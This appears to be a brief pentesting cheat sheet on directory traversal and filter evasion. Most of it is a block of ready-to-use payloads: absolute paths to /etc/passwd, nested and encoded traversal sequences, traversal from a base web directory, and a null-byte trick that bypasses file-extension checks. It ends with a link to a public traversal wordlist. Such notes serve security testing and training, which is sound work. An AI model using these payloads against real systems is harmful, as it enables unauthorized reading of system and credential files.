--- ---

<h2>Directory Traversal Injection Technique & Evasion</h2>

- Common
```

```

- Bypass
```
#Use an absolute path
filename=/etc/passwd

#Use nested traversal
....// or
....\/

#Utilize URL Encoding
- 16-bit
- Double URL
- UTF-8

#Burp Suite Professional
	§ Contains encoded path traversal sequences

#Start with the base file and traverse from there
filename=/var/www/images/../../../etc/passwd

#Bypass the requirement to end with a file extension by using a null byte
filename=../../../etc/passwd%00.png
```

- Wordlists ---> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/directory_traversal.txt